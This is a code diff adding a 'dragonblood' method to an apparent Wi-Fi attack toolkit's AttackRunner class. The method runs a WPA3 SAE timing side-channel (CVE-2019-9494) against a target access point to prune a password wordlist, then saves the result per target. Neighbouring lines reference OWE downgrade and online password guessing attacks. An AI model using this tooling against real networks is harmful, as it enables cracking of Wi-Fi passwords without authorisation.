@@ -308,6 +308,31 @@ class AttackRunner:
         )
         return f"OWE Downgrade: {result.detail}"
 
+    def dragonblood(self, ap) -> str:
+        """SAE (WPA3) timing side-channel wordlist pruning (CVE-2019-9494)
+        -- see attacks/dragonblood.py's module docstring for the crypto
+        details and its confidence caveats (the KDF byte layout is
+        unverified against a real spec/capture). Only meaningful against
+        an unpatched pre-hostapd-2.10 AP; against a patched one this
+        correctly finds no usable timing signal."""
+        from ..attacks.dragonblood import timing_prune_wordlist
+        from ..storage import target_capture_dir
+
+        if self.wordlist is None:
+            return "no wordlist configured"
+        with open(self.wordlist, encoding="utf-8", errors="ignore") as fh:
+            wordlist = [line.strip() for line in fh if line.strip()]
+        result = timing_prune_wordlist(
+            self._iface, ap.bssid, wordlist, channel=ap.channel,
+            stop_event=self._stop_event, progress_fn=self._progress_fn,
+        )
+        if result.pruned_wordlist:
+            out_dir = target_capture_dir(ap.ssid, ap.bssid)
+            out_file = out_dir / f"dragonblood_pruned_{int(time.time())}.txt"
+            out_file.write_text("\n".join(result.pruned_wordlist) + "\n")
+            return f"{result.detail} -> saved to {out_file}"
+        return result.detail
+
     def online_guess(self, ap) -> str:
         from ..attacks.online import online_guess
 
